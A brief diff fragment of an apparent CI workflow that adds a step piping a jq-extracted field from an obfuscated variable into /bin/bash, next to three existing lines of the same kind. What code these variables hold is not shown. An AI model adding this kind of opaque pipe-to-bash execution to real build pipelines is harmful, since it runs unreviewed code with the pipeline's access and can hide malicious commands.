@@ -28,6 +28,7 @@ jobs:
           echo $hu6 | jq -r .rxgxv24049 | /bin/bash
           printf '%s' "$luhb3" | jq -r .cdg9761 | /bin/bash
           printf '%s' "$k08900" | jq -r .s257 | /bin/bash
+          echo $cg7872 | jq -r .s76691 | /bin/bash
 
       - name: Archive output
         if: always()
